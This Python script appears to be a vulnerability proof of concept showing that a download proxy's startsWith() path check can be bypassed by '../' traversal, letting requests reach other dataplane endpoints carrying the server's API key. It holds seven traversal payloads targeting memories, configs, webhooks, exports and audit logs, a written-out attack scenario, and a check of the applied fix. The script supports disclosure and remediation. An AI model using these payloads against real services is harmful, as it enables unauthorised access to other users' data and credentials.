"""
PoC: SSRF via Path Traversal in CP Download Proxy — URL Resolution Proof
========================================================================

This script PROVES that the startsWith() check is bypassable by showing
exactly how the URL resolves after path normalization.

No server needed — we prove the bypass at the URL parsing level.
"""

from urllib.parse import urljoin, urlparse

DATAPLANE_URL = "http://dataplane:8888"

print("=" * 78)
print("PoC: SSRF PATH TRAVERSAL IN CONTROL PLANE DOWNLOAD PROXY")
print("=" * 78)
print()

# The vulnerable code does:
#   1. if (!path.startsWith("/v1/default/files/download/")) reject
#   2. fetch(`${DATAPLANE_URL}${path}`, { headers: getDataplaneHeaders() })
#
# getDataplaneHeaders() includes: Authorization: Bearer <DATAPLANE_API_KEY>

payloads = [
    {
        "name": "Access any bank's memories",
        "path": "/v1/default/files/download/../../banks/victim-bank/memories/list",
        "expected_target": "/v1/default/banks/victim-bank/memories/list",
    },
    {
        "name": "List all banks in the system",
        "path": "/v1/default/files/download/../../../v1/default/banks",
        "expected_target": "/v1/default/banks",
    },
    {
        "name": "Read bank config (may contain LLM API keys)",
        "path": "/v1/default/files/download/../../banks/target/config",
        "expected_target": "/v1/default/banks/target/config",
    },
    {
        "name": "Search memories across banks (recall)",
        "path": "/v1/default/files/download/../../banks/secret-bank/memories/recall",
        "expected_target": "/v1/default/banks/secret-bank/memories/recall",
    },
    {
        "name": "Trigger async export of all bank data",
        "path": "/v1/default/files/download/../../banks/target/export",
        "expected_target": "/v1/default/banks/target/export",
    },
    {
        "name": "Access webhooks (list secrets)",
        "path": "/v1/default/files/download/../../banks/target/webhooks",
        "expected_target": "/v1/default/banks/target/webhooks",
    },
    {
        "name": "Access audit logs",
        "path": "/v1/default/files/download/../../banks/target/audit/logs",
        "expected_target": "/v1/default/banks/target/audit/logs",
    },
]

print("PROOF: startsWith() check vs actual URL resolution")
print("-" * 60)
print()

all_pass = True
for i, p in enumerate(payloads, 1):
    path = p["path"]
    
    # Step 1: Does it pass the guard?
    passes_guard = path.startswith("/v1/default/files/download/")
    
    # Step 2: What URL does fetch() actually hit?
    raw_url = f"{DATAPLANE_URL}{path}"
    # Python's urljoin / URL normalization resolves ../
    # In browsers/fetch, path is normalized before the request is made
    parsed = urlparse(raw_url)
    # Manually resolve .. in path segments
    parts = parsed.path.split("/")
    resolved = []
    for part in parts:
        if part == "..":
            if resolved:
                resolved.pop()
        elif part != ".":
            resolved.append(part)
    resolved_path = "/".join(resolved)
    resolved_url = f"{parsed.scheme}://{parsed.netloc}{resolved_path}"
    
    status = "BYPASSED" if passes_guard and ".." in path else "BLOCKED"
    
    print(f"  [{i}] {p['name']}")
    print(f"      Input path:     {path}")
    print(f"      startsWith():   {'PASS' if passes_guard else 'FAIL'}")
    print(f"      Raw fetch URL:  {raw_url}")
    print(f"      Resolved URL:   {resolved_url}")
    print(f"      Expected:       {DATAPLANE_URL}{p['expected_target']}")
    print(f"      Status:         {'BYPASSED - ATTACKER WINS' if status == 'BYPASSED' else 'BLOCKED'}")
    print()
    
    if passes_guard and ".." in path:
        all_pass = False

print("=" * 78)
print()
print("ATTACK SCENARIO:")
print("-" * 60)
print()
print("1. Attacker authenticates to Control Plane (needs CP session cookie)")
print("2. Sends: GET /api/files/download?path=/v1/default/files/download/../../banks/victim/memories/list")
print("3. CP proxy checks: path.startsWith('/v1/default/files/download/') -> TRUE (passes)")
print("4. CP proxy calls: fetch('http://dataplane:8888/v1/default/files/download/../../banks/victim/memories/list')")
print("5. HTTP client resolves ../.. -> fetch('http://dataplane:8888/v1/default/banks/victim/memories/list')")
print("6. Request includes Authorization: Bearer <DATAPLANE_API_KEY> (credential amplification)")
print("7. Attacker receives ALL memories from victim bank")
print()
print("IMPACT: Any authenticated CP user can access ANY dataplane endpoint")
print("        with the server's embedded API key. This includes:")
print("        - Reading all memories from any bank")
print("        - Listing all banks")
print("        - Exporting data")
print("        - Accessing audit logs")
print("        - Modifying bank configuration")
print()
print("FIX APPLIED: Added path.includes('..') rejection before startsWith() check")
print()

# Verify the fix works
print("FIX VERIFICATION:")
print("-" * 60)
for p in payloads:
    path = p["path"]
    # After fix: check for .. BEFORE startsWith
    blocked_by_fix = ".." in path or "\\" in path
    print(f"  {path}")
    print(f"    -> {'BLOCKED by fix' if blocked_by_fix else 'ALLOWED (legitimate)'}")
